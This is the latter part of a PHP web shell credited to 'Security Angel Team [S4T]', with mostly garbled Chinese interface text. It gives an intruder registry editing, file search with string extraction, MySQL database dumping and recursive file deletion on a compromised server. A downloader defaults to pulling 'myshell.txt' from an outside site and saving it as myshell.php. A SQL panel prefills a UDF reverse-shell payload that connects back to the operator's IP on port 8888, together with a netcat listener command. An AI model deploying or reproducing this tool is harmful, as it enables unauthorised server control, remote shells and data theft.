	$cacheregtype = array('REG_SZ'=>'REG_SZ','REG_BINARY'=>'REG_BINARY','REG_DWORD'=>'REG_DWORD','REG_MULTI_SZ'=>'REG_MULTI_SZ','REG_EXPAND_SZ'=>'REG_EXPAND_SZ');
	$tb->tdbody('��ֵ: '.$tb->makeinput('writeregname',$registre,'','text','56').' ����: '.$tb->makeselect(array('name'=>'regtype','option'=>$cacheregtype,'selected'=>$regtype)).' ֵ:  '.$tb->makeinput('regval',$regval,'','text','15').' '.$tb->makeinput('regwrite','д��','','submit'),'center','2','50');
	echo "</form>";

	$tb->formheader($action,'ɾ��ע���');
	$tb->tdbody('��ֵ: '.$tb->makeinput('delregname',$delregname,'','text','100').' '.$tb->makeinput('regdelete','ɾ��','','submit'),'center','2','50');
	echo "</form>";
	$tb->tablefooter();
}//end reg
elseif ($_GET['action'] == "downloads"){
$action = '?action=dir';
	$tb->tableheader();
	$tb->formheader($action,'http�ļ�����ģʽ');
	$tb->tdbody('�����ʹ�ñ����ܰ�һЩС������http��ʽ���ص��˷�����','center');
	$tb->tdbody('�ļ�λ��: '.$tb->makeinput('durl','http://blog.blackwoods.com/miyabi/myshell.txt','','text','70').'<br>���ص�:'.$tb->makeinput('path','./myshell.php','','text','60').''.$tb->makehidden('do','downloads').''.$tb->makeinput('','����','','submit'),'center','1','35');
	echo "</form>";
	$tb->tdbody('ע��,�����ļ�̫���޷�������������Ӱ��ִ���ٶ�.','center');
	$tb->tablefooter();
}
elseif ($_GET['action'] == "search"){
$action = '?dir='.$dir.'';
	$tb->tableheader();
	$tb->formheader($action,'�ļ�����');
	$tb->tdbody('�����ʹ�ñ����ܲ���һ��Ŀ¼�µ��ļ�����д�ļ������Źؼ���!','center');
	$tb->tdbody('�ļ�λ��: '.$tb->makeinput('path',''.$nowpath.'','','text','70').'<br>��������:'.$tb->makeinput('oldkey','�¼�','','text','60').''.$tb->makehidden('do','search').'<br> �Ƿ����������<input type="checkbox" name="type" value="list" onclick="javascript:alert(\'ѡ���˴������г��ؼ����������ļ��Ķ�����,�����ڵ����ļ��ж����н��бȶ�\\n\\n��ʽΪ:[������/�ļ�����]����[12/99],�������з���.\\n\\n�˹��ܿ��ܻ�����һ���ֵ���ʱ,�뿼��ʹ��,û�пɶ�Ȩ�޽�����!\')"> (�˹��ܺ�����һ�����ܻ�Ӱ��ִ���ٶȣ�����Ĭ�Ϲر�!) <br>�ʵ���ȡ:<input type="checkbox" name="type2" value="getpath" onclick="javascript:alert(\'ѡ���˴������г��ؼ���������λ�ü����趨���������ڵĲ����ַ�..\\n\\n��ȡ�˹��ܲ������ļ��������ƶ����ҵ����ļ����ϼ��ɶ�ȡ����....\\n\\n�˹��ܿ��ܻ�����һ���ֵ���ʱ,�뿼��ʹ��,û�пɶ�Ȩ�޽�����!\')"> ��ȡ�ؼ���ǰ'.$tb->makeinput('beline','0','','text','3').'���ַ� '.$tb->makehidden('dir',''.$dir.'').'���ؼ��ʺ��'.$tb->makeinput('endline','10','','text','3').'���ַ�... '.$tb->makehidden('dir',''.$dir.'').''.$tb->makeinput('','��ʼ�����ļ�','','submit'),'center','1','35');
	echo "</form>";
	$tb->tdbody('���̫���Ŀ¼�ˣ�������������Һò�����.����ѡ���������ٶȻ�������ʾ[������/�ܹ�������]','center');
	$tb->tablefooter();
}

elseif ($_GET['action'] == "sql") {
	$action = '?action=sql';

	$servername = isset($_POST['servername']) ? $_POST['servername'] : 'localhost';
	$dbusername = isset($_POST['dbusername']) ? $_POST['dbusername'] : 'root';
	$dbpassword = $_POST['dbpassword'];
	$dbname = $_POST['dbname'];
	$sql_query = $_POST['sql_query'];
if($type=="fun"){
$sql_query = "CREATE FUNCTION Mixconnect RETURNS STRING SONAME 'C:\\\Winnt\\\Mix.dll';
select Mixconnect('".$_SERVER['REMOTE_ADDR']."','8888');/*��������ִ��������һ������*/
/*������������ִ�� nc -vv -l -p 8888*/";
}
	$tb->tableheader();
	$tb->formheader($action,'ִ�� SQL ���');
	$tb->tdbody('Host: '.$tb->makeinput('servername',$servername,'','text','20').' User: '.$tb->makeinput('dbusername',$dbusername,'','text','15').' Pass: '.$tb->makeinput('dbpassword',$dbpassword,'','text','15').' DB: '.$tb->makeinput('dbname',$dbname,'','text','15').' '.$tb->makeinput('connect','����','','submit'));
	$tb->tdbody($tb->maketextarea('sql_query',$sql_query,'85','10'));
	$tb->makehidden('do','query');
	$tb->formfooter('1','30');
}//end sql query

elseif ($_GET['action'] == "sqlbak") {
	$action = '?action=sqlbak';
	$servername = isset($_POST['servername']) ? $_POST['servername'] : 'localhost';
	$dbusername = isset($_POST['dbusername']) ? $_POST['dbusername'] : 'root';
	$dbpassword = $_POST['dbpassword'];
	$dbname = $_POST['dbname'];
	$tb->tableheader();
	$tb->formheader($action,'���� MySQL ���ݿ�');
	$tb->tdbody('Host: '.$tb->makeinput('servername',$servername,'','text','20').' User: '.$tb->makeinput('dbusername',$dbusername,'','text','15').' Pass: '.$tb->makeinput('dbpassword',$dbpassword,'','text','15').' DB: '.$tb->makeinput('dbname',$dbname,'','text','15').' '.$tb->makeinput('connect','����','','submit'));
	@mysql_connect($servername,$dbusername,$dbpassword) AND @mysql_select_db($dbname);
    $tables = @mysql_list_tables($dbname);
    while ($table = @mysql_fetch_row($tables)) {
		$cachetables[$table[0]] = $table[0];
    }
    @mysql_free_result($tables);
	if (empty($cachetables)) {
		$tb->tdbody('<b>��û���������ݿ� or ��ǰ���ݿ�û���κ����ݱ�</b>');
	} else {
		$tb->tdbody('<table border="0" cellpadding="3" cellspacing="1"><tr><td valign="top">��ѡ���:</td><td>'.$tb->makeselect(array('name'=>'table[]','option'=>$cachetables,'multiple'=>1,'size'=>15,'css'=>1)).'</td></tr><tr nowrap><td><input type="radio" name="backuptype" value="server" checked> ���������������·��:</td><td>'.$tb->makeinput('path',$pathname.'/'.$_SERVER['HTTP_HOST'].'_MySQL.sql','','text','50').'</td></tr><tr nowrap><td colspan="2"><input type="radio" name="backuptype" value="download"> ֱ�����ص����� (�ʺ���������С�����ݿ�)</td></tr></table>');
		$tb->makehidden('do','backupmysql');
		$tb->formfooter('0','30');
	}
	$tb->tablefooter();
	@mysql_close();
}//end sql backup

elseif ($_GET['action'] == "phpenv") {
	$user = " <a href=\"?action=nowuser\" target=\"_blank\">����crush��˻�ȡ��ǰ�����û���</a> ";
	$upsize=get_cfg_var("file_uploads") ? get_cfg_var("upload_max_filesize") : "�������ϴ�";
	$adminmail=(isset($_SERVER['SERVER_ADMIN'])) ? "<a href=\"mailto:".$_SERVER['SERVER_ADMIN']."\">".$_SERVER['SERVER_ADMIN']."</a>" : "<a href=\"mailto:".get_cfg_var("sendmail_from")."\">".get_cfg_var("sendmail_from")."</a>";
	if ($dis_func == "") {
		$dis_func = "No";
	}else {
		$dis_func = str_replace(" ","<br>",$dis_func);
		$dis_func = str_replace(",","<br>",$dis_func);
	}
	$phpinfo=(!eregi("phpinfo",$dis_func)) ? "Yes" : "No";
		
	$tb->tableheader();
	echo "<form action=\"?action=phpenv\" method=\"POST\">\n";
	$tb->tdbody('<b>�鿴PHP���ò���״��</b>','left','1','30','style="padding-left: 5px;"');
	$tb->tdbody('���������ò���(��:magic_quotes_gpc): '.$tb->makeinput('phpvarname','','','text','40').' '.$tb->makeinput('','�鿴','','submit'),'left','2','30','style="padding-left: 5px;"');
	$tb->makehidden('do','viewphpvar');
	echo "</form>\n";
	$hp = array(0=> '����������', 1=> 'PHP��������', 2=> '���֧��״��');
	for ($a=0;$a<3;$a++) {
		$tb->tdbody('<b>'.$hp[1].'</b>','left','1','30','style="padding-left: 5px;"');
?>
  <tr class="secondalt">
    <td>
      <table width="100%" border="0" cellpadding="0" cellspacing="0">
<?php
		if ($a==0) {
			for($i=0;$i<=12;$i++) {
				echo "<tr><td width=40% style=\"padding-left: 5px;\">".$info[$i][0]."</td><td>".$info[$i][1]."</td></tr>\n";
			}
		} elseif ($a == 1) {
			for ($i=13;$i<=24;$i++) {
				echo "<tr><td width=40% style=\"padding-left: 5px;\">".$info[$i][0]."</td><td>".$info[$i][1]."</td></tr>\n";
			}
		} elseif ($a == 2) {
			for ($i=25;$i<=40;$i++) {
				echo "<tr><td width=40% style=\"padding-left: 5px;\">".$info[$i][0]."</td><td>".$info[$i][1]."</td></tr>\n";
			}
		}
?>
      </table>
    </td>
  </tr>
<?php
	}//for
echo "</table>";
}//end phpenv
elseif($_GET['action'] == "SUExp")
{
    

}
?>
<hr width="775" noshade>
<table width="775" border="0" cellpadding="0">
  <tr>
    <td>Copyright (C) 2004 Security Angel Team [S4T] All Rights Reserved.</td>
    <td align="right"><?php
	debuginfo();
	ob_end_flush();	
	?></td>
  </tr>
</table>
</center>
</body>
</html>

<?php

/*======================================================
������
======================================================*/

	// ��½���
	function loginpage() {
?>
<style type="text/css">
input {font-family: "Verdana";font-size: "11px";BACKGROUND-COLOR: "#FFFFFF";height: "18px";border: "1px solid #666666";}
</style>
<table width="416" border="0" align="center" cellpadding="0" cellspacing="0">
<form method="POST" action="">
  <tr> 
    <td height="75" align="center">
<span style="font-size: 11px; font-family: Verdana">Password: </span><input name="adminpass" type="password" size="20">
<input type="hidden" name="do" value="login">
<input type="submit" value="Login">
	</td>
  </tr>
  </form>
  </table>

<?php
		exit;
	}//end loginpage()

	// ҳ�������Ϣ
	function debuginfo() {
		global $starttime;
		$mtime = explode(' ', microtime());
		$totaltime = number_format(($mtime[1] + $mtime[0] - $starttime), 6);
		echo "Processed in $totaltime second(s)";
	}

	// ȥ��ת���ַ�
	function stripslashes_array(&$array) {
		while(list($key,$var) = each($array)) {
			if ($key != 'argc' && $key != 'argv' && (strtoupper($key) != $key || ''.intval($key) == "$key")) {
				if (is_string($var)) {
					$array[$key] = stripslashes($var);
				}
				if (is_array($var))  {
					$array[$key] = stripslashes_array($var);
				}
			}
		}
		return $array;
	}

	// ɾ��Ŀ¼
	function deltree($deldir) {
		$mydir=@dir($deldir);	
		while($file=$mydir->read())	{ 		
			if((is_dir("$deldir/$file")) AND ($file!=".") AND ($file!="..")) { 
				@chmod("$deldir/$file",0777);
				deltree("$deldir/$file"); 
			}
			if (is_file("$deldir/$file")) {
				@chmod("$deldir/$file",0777);
				@unlink("$deldir/$file");
			}
		} 
		$mydir->close(); 
		@chmod("$deldir",0777);
		return (@rmdir($deldir)) ? 1 : 0;
	} 

	// �ж϶�д���
	function dir_writeable($dir) {
		if (!is_dir($dir)) {
			@mkdir($dir, 0777);
		}
		if(is_dir($dir)) {
			if ($fp = @fopen("$dir/test.txt", 'w')) {
				@fclose($fp);
				@unlink("$dir/test.txt");
				$writeable = 1;
			} else {
				$writeable = 0;
			}
		}
		return $writeable;
	}

	// ����м�ı���ɫ�滻
	function getrowbg() {
		global $bgcounter;
		if ($bgcounter++%2==0) {
			return "firstalt";
		} else {
			return "secondalt";
		}
	}

	// ��ȡ��ǰ���ļ�ϵͳ·��
	function getPath($mainpath, $relativepath) {
		global $dir;
		$mainpath_info           = explode('/', $mainpath);
		$relativepath_info       = explode('/', $relativepath);
		$relativepath_info_count = count($relativepath_info);
		for ($i=0; $i<$relativepath_info_count; $i++) {
			if ($relativepath_info[$i] == '.' || $relativepath_info[$i] == '') continue;
			if ($relativepath_info[$i] == '..') {
				$mainpath_info_count = count($mainpath_info);
				unset($mainpath_info[$mainpath_info_count-1]);
				continue;
			}
			$mainpath_info[count($mainpath_info)] = $relativepath_info[$i];
		} //end for
		return implode('/', $mainpath_info);
	}

	// ���PHP���ò���
	function getphpcfg($varname) {
		switch($result = get_cfg_var($varname)) {
			case 0:
			return "No";
			break;
			case 1:
			return "Yes";
			break;
			default:
			return $result;
			break;
		}
	}

	// ��麯�����
	function getfun($funName) {
		return (false !== function_exists($funName)) ? "Yes" : "No";
	}

	

	// �������ݿ�
	function sqldumptable($table, $fp=0) {
		
	}

	class FORMS {
		function tableheader() {
			echo "<table width=\"775\" border=\"0\" cellpadding=\"3\" cellspacing=\"1\" bgcolor=\"#ffffff\">\n";
		}

		function headerform($arg=array()) {
			global $dir;
			if ($arg[enctype]){
				$enctype="enctype=\"$arg[enctype]\"";
			} else {
				$enctype="";
			}
			if (!isset($arg[method])) {
				$arg[method] = "POST";
			}
			if (!isset($arg[action])) {
				$arg[action] = '';
			}
			echo "  <form action=\"".$arg[action]."\" method=\"".$arg[method]."\" $enctype>\n";
			echo "  <tr>\n";
			echo "    <td>".$arg[content]."</td>\n";
			echo "  </tr>\n";
			echo "  </form>\n";
		}

		function tdheader($title) {
			global $dir;
			echo "  <tr class=\"firstalt\">\n";
			echo "	<td align=\"center\"><b>".$title." [<a href=\"?dir=".urlencode($dir)."\">����</a>]</b></td>\n";
			echo "  </tr>\n";
		}

		function tdbody($content,$align='center',$bgcolor='2',$height='',$extra='',$colspan='') {
			if ($bgcolor=='2') {
				$css="secondalt";
			} elseif ($bgcolor=='1') {
				$css="firstalt";
			} else {
				$css=$bgcolor;
			}
			$height = empty($height) ? "" : " height=".$height;
			$colspan = empty($colspan) ? "" : " colspan=".$colspan;
			echo "  <tr class=\"".$css."\">\n";
			echo "	<td align=\"".$align."\"".$height." ".$colspan." ".$extra.">".$content."</td>\n";
			echo "  </tr>\n";
		}

		function tablefooter() {
			echo "</table>\n";
		}

		function formheader($action='',$title,$target='') {
			global $dir;
			$target = empty($target) ? "" : " target=\"".$target."\"";
			echo " <form action=\"$action\" method=\"POST\"".$target.">\n";
			echo "  <tr class=\"firstalt\">\n";
			echo "	<td align=\"center\"><b>".$title." [<a href=\"?dir=".urlencode($dir)."\">����</a>]</b></td>\n";
			echo "  </tr>\n";
		}

		function makehidden($name,$value=''){
			echo "<input type=\"hidden\" name=\"$name\" value=\"$value\">\n";
		}

		function makeinput($name,$value='',$extra='',$type='text',$size='30',$css='input'){
			$css = ($css == 'input') ? " class=\"input\"" : "";
			$input = "<input name=\"$name\" value=\"$value\" type=\"$type\" ".$css." size=\"$size\" $extra>\n";
			return $input;
		}

		function maketextarea($name,$content='',$cols='100',$rows='20',$extra=''){
			$textarea = "<textarea name=\"".$name."\" cols=\"".$cols."\" rows=\"".$rows."\" ".$extra.">".$content."</textarea>\n";
			return $textarea;
		}

		function formfooter($over='',$height=''){
			$height = empty($height) ? "" : " height=\"".$height."\"";
			echo "  <tr class=\"secondalt\">\n";
			echo "	<td align=\"center\"".$height."><input class=\"input\" type=\"submit\" value=\"ȷ��\"></td>\n";
			echo "  </tr>\n";
			echo " </form>\n";
			echo $end = empty($over) ? "" : "</table>\n";
		}

		function makeselect($arg = array()){
			if ($arg[multiple]==1) {
				$multiple = " multiple";
				if ($arg[size]>0) {
					$size = "size=$arg[size]";
				}
			}
			if ($arg[css]==0) {
				$css = "class=\"input\"";
			}
			$select = "<select $css name=\"$arg[name]\"$multiple $size>\n";
				if (is_array($arg[option])) {
					foreach ($arg[option] AS $key=>$value) {
						if (!is_array($arg[selected])) {
							if ($arg[selected]==$key) {
								$select .= "<option value=\"$key\" selected>$value</option>\n";
							} else {
								$select .= "<option value=\"$key\">$value</option>\n";
							}

						} elseif (is_array($arg[selected])) {
							if ($arg[selected][$key]==1) {
								$select .= "<option value=\"$key\" selected>$value</option>\n";
							} else {
								$select .= "<option value=\"$key\">$value</option>\n";
							}
						}
					}
				}
			$select .= "</select>\n";
			return $select;
		}
	}
	
	function find($path) //���ҹؼ��� 
{ 
	global $oldkey,$type,$type2,$endline,$beline; 
	if(is_dir("$path")){ 
	$tempdir=opendir("$path");
	while($f=readdir($tempdir)){ if($f=="."||$f=="..")continue;  find("$path/$f");}
	closedir($tempdir);
	}else{ 
	if(filesize("$path")){ 
	$fp=fopen("$path","r"); 
	$msg=fread($fp, filesize("$path"));
	fclose($fp); 
if(strpos($msg, $oldkey) !== false) {
	$dir = dirname($path);
	$file = basename($path);
if($type=="list"){
	$mymsg = explode("\n",$msg);
	$long = count($mymsg);
	$tmp = explode($oldkey,$msg);
	$tmp = explode("\n",$tmp[0]);
	$first = count($tmp);
	$end = "[".$first."/".$long."]";
}
if($type2=="getpath"){
	$get = explode($oldkey,$msg);
	$get = strlen($get[0]);
	if(isset($beline)){
	$get = $get-$beline;
	}
	$getpath = htmlspecialchars(substr($msg, $get, $endline)); 
	$getpath = "title = \"".$getpath."\"";
}
echo "<span class=\"redfont\" $getpath>�ҵ�:$dir/$file</span> |<a href=\"?action=editfile&dir=$dir&editfile=$file\" target=\"_blank\">view+edit</a> | $end <br>";
}
                              } 
                         }                    
} 
?>